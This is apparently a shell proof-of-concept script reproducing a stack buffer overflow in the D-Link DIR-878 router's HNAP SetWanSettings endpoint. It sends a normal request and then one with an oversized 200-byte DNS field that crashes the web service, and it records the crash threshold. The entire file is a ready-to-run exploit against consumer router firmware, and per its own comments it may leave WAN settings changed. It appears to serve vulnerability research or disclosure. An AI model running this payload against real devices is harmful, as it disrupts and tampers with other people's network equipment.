#!/bin/sh
# Reproduction script for: DIR-878 SetWanSettings ConfigDNS stack overflow (wan0, Static/DHCP)
# Derived from the requests recorded in README.md. Non-destructive for the control case;
# the attack case crashes the FastCGI worker (auto-restarted) and may leave nvram WAN values set.
# Authorized testing only.
T="${1:?usage: sh poc.sh <router-ip>}"
post() {
  curl -s -o /dev/null -w "    HTTP %{http_code}\n" -X POST "http://$T/HNAP1/?GetCAPTCHAsetting" \
    -H 'SOAPAction: "http://purenetworks.com/HNAP1/SetWanSettings"' \
    -H 'Content-Type: text/xml' --data-binary "$1"
}
mk() { # $1 = Primary value
cat <<XML
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetWanSettings xmlns="http://purenetworks.com/HNAP1/"><Type>Static</Type><ConfigDNS><Primary>$1</Primary><Secondary>2.2.2.2</Secondary></ConfigDNS><MTU>1500</MTU><IPAddress>10.0.0.2</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.0.0.1</Gateway><MacAddress>00:11:22:33:44:55</MacAddress></SetWanSettings></soap:Body></soap:Envelope>
XML
}
echo "[*] Control Primary=1.1.1.1 - expect 200 OK"
post "$(mk 1.1.1.1)"
echo "[*] Attack  Primary=200xA - expect 500 (SIGSEGV + core)"
post "$(mk $(printf 'A%.0s' $(seq 200)))"
echo "[*] Note: recorded crash threshold was 164-176 bytes; adjust the width to reproduce on your build."
